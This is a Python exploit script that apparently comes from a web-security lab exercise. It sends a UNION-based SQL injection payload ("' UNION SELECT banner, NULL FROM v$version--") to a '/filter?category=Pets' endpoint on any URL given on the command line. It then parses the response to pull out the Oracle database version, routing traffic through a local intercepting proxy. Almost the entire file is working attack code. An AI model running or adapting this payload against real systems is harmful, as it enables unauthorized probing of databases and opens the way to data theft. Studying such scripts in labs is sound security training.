import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

# Disable SSL/TLS warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure proxy settings if needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url):
    path = '/filter?category=Pets'
    sql_payload = "' UNION SELECT banner, NULL FROM v$version--"
    
    try:
        response = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        response.raise_for_status()
        res = response.text

        if "Oracle Database" in res:
            print("[+] surum numarası")
            soup = BeautifulSoup(res, 'html.parser')
            version = soup.find(string=re.compile('.*Oracle\sDatabase.*'))
            print("[+] The Oracle Database version: '%s'" % version)
            return True

        return False

    except requests.exceptions.RequestException as e:
        print("[-] Error:", e)
        return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] For Example: %s http://www.random.com" % sys.argv[0])
        sys.exit(-1)

    target_url = sys.argv[1].strip()
    print("[+]  Dumping")

    if not exploit_sqli(target_url):
        print("[+] SQL Injection not found")
